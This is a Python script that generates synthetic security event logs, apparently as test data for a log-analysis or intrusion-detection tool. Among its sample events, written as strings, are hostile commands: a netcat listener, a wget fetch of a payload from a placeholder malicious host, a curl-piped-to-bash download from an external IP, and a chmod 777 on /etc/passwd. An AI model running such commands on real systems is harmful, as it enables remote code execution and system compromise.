import json
import random
import datetime
import os

os.makedirs('logs', exist_ok=True)

USERS = ['damon', 'admin', 'root', 'ubuntu', 'sysadmin']
SUSPICIOUS_USERS = ['guest', 'test', 'oracle', 'postgres', 'pi']
IPS_NORMAL = ['192.168.1.10', '192.168.1.15', '192.168.1.22']
IPS_SUSPICIOUS = ['45.33.32.156', '198.20.69.74', '89.248.165.64', '185.220.101.45']

def random_time(hours_ago=24):
    now = datetime.datetime.now()
    offset = random.randint(0, hours_ago * 3600)
    return (now - datetime.timedelta(seconds=offset)).strftime('%Y-%m-%dT%H:%M:%S')

events = []

# Normal sudo usage
for _ in range(12):
    events.append({
        'timestamp': random_time(),
        'event_type': 'sudo',
        'user': random.choice(USERS[:2]),
        'source_ip': random.choice(IPS_NORMAL),
        'command': random.choice(['/usr/bin/apt-get update', '/usr/bin/systemctl restart nginx', '/usr/bin/tail -f /var/log/syslog']),
        'status': 'success',
        'severity': 'low'
    })

# Failed SSH login attempts from suspicious IPs
for _ in range(28):
    events.append({
        'timestamp': random_time(),
        'event_type': 'ssh_failed_login',
        'user': random.choice(SUSPICIOUS_USERS),
        'source_ip': random.choice(IPS_SUSPICIOUS),
        'port': 22,
        'status': 'failed',
        'severity': 'high',
        'note': 'repeated failed authentication from external IP'
    })

# Brute force pattern - same IP multiple failures
brute_ip = '45.33.32.156'
brute_time = datetime.datetime.now() - datetime.timedelta(hours=2)
for i in range(14):
    t = brute_time + datetime.timedelta(seconds=i * 3)
    events.append({
        'timestamp': t.strftime('%Y-%m-%dT%H:%M:%S'),
        'event_type': 'ssh_failed_login',
        'user': SUSPICIOUS_USERS[i % len(SUSPICIOUS_USERS)],
        'source_ip': brute_ip,
        'port': 22,
        'status': 'failed',
        'severity': 'critical',
        'note': 'rapid sequential login attempts — possible brute force'
    })

# Privilege escalation attempt
for _ in range(4):
    events.append({
        'timestamp': random_time(4),
        'event_type': 'privilege_escalation',
        'user': random.choice(SUSPICIOUS_USERS),
        'source_ip': random.choice(IPS_SUSPICIOUS),
        'command': random.choice(['sudo su -', 'sudo /bin/bash', 'chmod 777 /etc/passwd']),
        'status': 'blocked',
        'severity': 'critical',
        'note': 'unauthorized privilege escalation attempt blocked'
    })

# Unusual process execution
for _ in range(6):
    events.append({
        'timestamp': random_time(8),
        'event_type': 'process_execution',
        'user': random.choice(SUSPICIOUS_USERS),
        'source_ip': random.choice(IPS_SUSPICIOUS),
        'process': random.choice(['nc -lvp 4444', 'wget http://malicious.example.com/payload', 'curl -s http://45.33.32.156/shell.sh | bash']),
        'status': 'detected',
        'severity': 'critical',
        'note': 'suspicious process execution pattern detected'
    })

# Successful logins from known IPs
for _ in range(8):
    events.append({
        'timestamp': random_time(),
        'event_type': 'ssh_successful_login',
        'user': random.choice(USERS[:2]),
        'source_ip': random.choice(IPS_NORMAL),
        'port': 22,
        'status': 'success',
        'severity': 'info'
    })

# Sort by timestamp
events.sort(key=lambda x: x['timestamp'])

output_path = 'logs/security_events.json'
with open(output_path, 'w') as f:
    json.dump(events, f, indent=2)

print(f"Generated {len(events)} security events")
print(f"Saved to {output_path}")

summary = {}
for e in events:
    summary[e['event_type']] = summary.get(e['event_type'], 0) + 1

print("\nEvent breakdown:")
for k, v in sorted(summary.items()):
    print(f"  {k}: {v}")
